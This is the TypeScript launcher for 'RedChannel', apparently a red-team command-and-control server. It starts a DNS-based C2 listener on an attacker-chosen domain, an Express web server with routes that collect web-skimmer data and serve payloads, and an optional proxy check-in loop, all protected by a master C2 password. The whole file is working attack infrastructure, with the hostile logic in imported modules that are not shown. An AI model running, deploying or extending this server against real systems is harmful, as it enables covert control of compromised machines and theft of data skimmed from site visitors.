import chalk from "chalk";
import * as dnsd from "dnsd2";
import { createCommand } from "commander";
import express from "express";
import _merge from "lodash.merge";

import RedChannel from "./lib/redchannel";
import Logger from "./lib/logger";
import { Config, Constants, Banner, emsg } from "./utils";
import { DefaultConfig, RedChannelConfig } from "./lib/config";

const log = new Logger();

const program = createCommand();
program
    .version(Constants.VERSION, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", Config.DEFAULT_CONFIG_FILE)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-d, --domain <domain>", "specify the c2 domain")
    .option("-B, --ip, --dns-ip [ip]", "bind dns c2 to ip")
    .option("-P, --port, --dns-port [port]", "listen for dns on a specific port")
    .option("-W, --web-ip [ip]", "bind web server to ip")
    .option("-Y, --web-port [port]", "listen for web on a specific port")
    .option("-D, --debug", "enable debug", false)
    .parse();

// env password takes priority over commandline
const cliPassword = (process.env.RC_PASSWORD as string) ?? (program.getOptionValue("password") as string);
if (!cliPassword) {
    log.error("! please specify a master c2 password via command-lie or environment variable, see '--help'");
    process.exit(1);
}

const cliConfig: RedChannelConfig = _merge(DefaultConfig, {
    c2: {
        domain: program.getOptionValue("domain"),
        dns_ip: program.getOptionValue("ip"),
        dns_port: program.getOptionValue("port"),
        web_ip: program.getOptionValue("webIp"),
        web_port: program.getOptionValue("webPort"),
        debug: program.getOptionValue("debug"),
    },
});

const cliConfigFilePath = program.getOptionValue("config");

let redchannel: RedChannel;
try {
    redchannel = new RedChannel(cliPassword, cliConfigFilePath, cliConfig);
} catch (ex) {
    log.error(`! error instantiating redchannel: ${emsg(ex)}`);
    process.exit(1);
}

log.msg(chalk.redBright(Banner));

process.on("uncaughtException", (ex, origin) => {
    log.error(`process error: ${emsg(ex)}, origin: ${origin}`);
});

/**
 * c2-web listener
 */
const webServer = express();
webServer.get(redchannel.config.skimmer.data_route, redchannel.modules.skimmer.dataRouteHandler.bind(redchannel.modules.skimmer));
webServer.get(redchannel.config.skimmer.payload_route, redchannel.modules.skimmer.payloadRouteHandler.bind(redchannel.modules.skimmer));

const c2Config = redchannel.config.c2;
webServer.listen(c2Config.web_port, c2Config.web_ip, () => {
    log.info(`c2-web listening on: ${redchannel.config.c2.web_ip}:${redchannel.config.c2.web_port}`);
});

/**
 * c2-dns
 */
const dnsServer = dnsd.createServer(redchannel.c2MessageHandler.bind(redchannel));

dnsServer.on("error", (ex: Error, msg: Error) => {
    log.error(`dns server error: ${emsg(ex)}, msg: ${emsg(msg)}`);
});

// prettier-ignore
dnsServer
    .zone(
        c2Config.domain,
        'ns1.' + c2Config.domain,
        'root@' + c2Config.domain,
        'now',
        '2h',
        '30m',
        '2w',
        '10m'
    )
    .listen(c2Config.dns_port, c2Config.dns_ip);

log.info(`c2-dns listening on: ${c2Config.dns_ip}:${c2Config.dns_port}, c2 domain: ${c2Config.domain}`);

const proxyConfig = redchannel.config.proxy;
if (proxyConfig.enabled) {
    log.info(`c2-proxy enabled, checkin at interval: ${proxyConfig.interval}ms`);
    redchannel.modules.proxy.proxyFetchLoop();
} else {
    log.info("c2-proxy is disabled, see 'use proxy' -> 'help'");
}
